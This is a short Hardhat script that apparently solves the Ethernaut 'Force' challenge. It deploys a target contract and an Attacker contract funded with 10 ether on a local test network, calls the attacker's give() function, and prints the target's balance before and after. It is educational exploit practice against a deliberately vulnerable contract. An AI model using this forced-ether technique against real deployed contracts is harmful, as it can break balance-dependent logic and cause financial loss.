const hre = require("hardhat");
const {waffle} = require("hardhat");

import { Signer } from "ethers";
const ethers = hre.ethers;
const provider = waffle.provider;

async function main(){
    let user: Signer, hacker: Signer;

    [user, hacker] = await ethers.getSigners();
    console.log('User address', await user.getAddress());
    console.log('Hacker address', await hacker.getAddress());

    const Force = await ethers.getContractFactory("Force", user);
    const force = await Force.deploy();
    await force.deployed();

    const Attacker = await ethers.getContractFactory("Attacker", hacker);
    const attacker = await Attacker.deploy(force.address, {value: await ethers.utils.parseEther("10")});
    await attacker.deployed();

    console.log('Initially, balance of force is', await ethers.utils.formatEther(await provider.getBalance(force.address)));

    await attacker.give();

    console.log('Finally, balance of force is', await ethers.utils.formatEther(await provider.getBalance(force.address)));

}

main().then(()=>process.exit(0))
    .catch((err)=>{
        console.log(err);
        process.exit(1);
    })
    